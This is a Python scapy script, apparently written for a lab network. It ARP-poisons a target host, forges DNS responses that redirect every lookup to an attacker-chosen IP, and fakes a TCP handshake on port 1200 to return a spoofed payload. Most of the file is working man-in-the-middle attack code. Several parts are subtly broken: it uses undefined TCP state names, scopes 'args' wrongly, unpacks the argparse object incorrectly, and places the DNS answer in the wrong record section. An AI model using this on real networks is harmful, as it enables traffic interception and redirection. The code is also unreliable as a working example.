from enum import Enum
import logging
from multiprocessing import Process
import random
import sys
import json
import time
from scapy.layers.dns import DNS
from scapy.layers.inet import UDP
from scapy.layers.l2 import Ether, ARP
from scapy.all import *
from ARPMITM import ARPAlchemist
import coloredlogs
from getmac import get_mac_address as gma
import argparse



INTERFACE = "eth0"
# DEFAULT_GATEWAY_HW_ADDR = "02:42:5d:9a:35:af"
DEFAULT_SRC_HW_ADDR = gma(INTERFACE)  # 02:42:ac:13:00:03
DEFAULT_TARGET_HW_ADDR = "02:42:ac:12:00:02"
DEFAULT_GW_IP_ADDR = "172.18.0.1"
DEFAULT_TARGET_IP_ADDR = "172.18.0.2"
DEFAULT_SRC_IP_ADDR = "172.18.0.3"
DEFAULT_DNS_RESOLUTION = "172.18.0.1"
args = None

INITIAL_SEQ = random.randint(0, 10000)

sent_packet = False



def on_dns_packet(packet: Packet) -> None:
    global sent_packet
    global args
    logging.info(f"handling DNS request")
    if packet["Ethernet"].src == args.hwdst and packet["Ethernet"].dst == args.hwsrc:
        # Construct the DNS packet
        # Construct the Ethernet header by looking at the sniffed packet
        eth = Ether(src=packet[Ether].dst, dst=packet[Ether].src)

        # Construct the IP header by looking at the sniffed packet
        ip = IP(src=packet[IP].dst, dst=packet[IP].src)

        # Construct the UDP header by looking at the sniffed packet
        udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)

        # Construct the DNS response by looking at the sniffed packet and manually
        dns = DNS(
            id=packet[DNS].id,
            qd=packet[DNS].qd,
            aa=1,
            rd=0,
            qr=1,
            qdcount=1,
            ancount=1,
            nscount=0,
            arcount=0,
            ar=DNSRR(
                rrname=packet[DNS].qd.qname,
                type="A",
                ttl=600,
                rdata=DEFAULT_DNS_RESOLUTION,
            ),
        )

        # Put the full packet together
        response_packet = eth / ip / udp / dns

        # Send the DNS response
        sendp(response_packet, iface=INTERFACE)


def on_http_packet(p: Packet) -> None:
    global http_server_state

    logging.info(p.summary())
    # assert p[IP].dst == DEFAULT_DNS_RESOLUTION
    # assert p[IP].src == DEFAULT_TARGET_IP_ADDR
    # assert p[TCP].dport == 1200

    logging.info(f"handling HTTP request")

    if http_server_state == TCPServerState.LISTEN:
        if p[TCP].flags == "S":
            eth = Ether(src=p[Ether].dst, dst=p[Ether].src)

            ip = IP(src=p[IP].dst, dst=p[IP].src)

            tcp = TCP(
                flags="SA",
                sport=p[TCP].dport,
                dport=p[TCP].sport,
                seq=INITIAL_SEQ,
                ack=p[TCP].seq + 1,
            )

            r = eth / ip / tcp
            logging.info("SENDING SYN-ACK:")
            r.show()
            sendp(r, iface=INTERFACE)
            http_server_state = TCPServerState.SYN_RECEIVED
        else:
            logging.error(f"unexpected packet: {p.summary()}")

    elif http_server_state == TCPServerState.SYN_RECEIVED:
        if p[TCP].flags == "A":
            logging.info("received ack")
            http_server_state = TCPServerState.ESTABLISHED
        else:
            logging.error(f"unexpected packet: {p.summary()}")

    elif http_server_state == TCPServerState.ESTABLISHED:
        logging.info("WE ESTABLISHED")
        if p[TCP].flags == "PA":
            eth = Ether(src=p[Ether].dst, dst=p[Ether].src)

            ip = IP(src=p[IP].dst, dst=p[IP].src)

            payload = json.dumps({"secret": "test"})

            tcp = TCP(
                flags="PA",
                sport=p[TCP].dport,
                dport=p[TCP].sport,
                seq=INITIAL_SEQ + len(payload),
                ack=p[TCP].seq,
            )

            raw = Raw(load=payload)

            r = eth / ip / tcp / raw
            logging.info("SENDING PAY-ACK:")
            r.show()
            sendp(r, iface=INTERFACE)
            http_server_state = TCPServerState.FIN_WAIT_1
        pass


def on_packet(p: Packet) -> None:
    if UDP in p and DNS in p:
        on_dns_packet(p)
    if TCP in p and p[TCP].dport == 1200:
        on_http_packet(p)
    # if ARP in p:
    #     logging.info(f"handling ARP request")
    #     p.show()


def main() -> None:
    logging.basicConfig(level=logging.INFO)
    parser = argparse.ArgumentParser()
    parser.add_argument("--interface", type=str)
    parser.add_argument("--attacker_mac", type=str)
    parser.add_argument("--gateway_mac", type=str)
    parser.add_argument("--target_mac", type=str)
    parser.add_argument("--gateway_ip", type=str)
    parser.add_argument("--target_ip", type=str)
    parser.add_argument("--interval", type=float, default=0.5)
    parser.add_argument("--verbose", type=bool, default=False)
    args = parser.parse_args()

    arp_archelmist = ARPAlchemist(**args)
    arp_archelmist.start_poisoning()
    sniff(quiet=True, store=False, iface=INTERFACE, prn=on_packet)
    arp_archelmist.stop_poisoning()


if __name__ == "__main__":
    main()

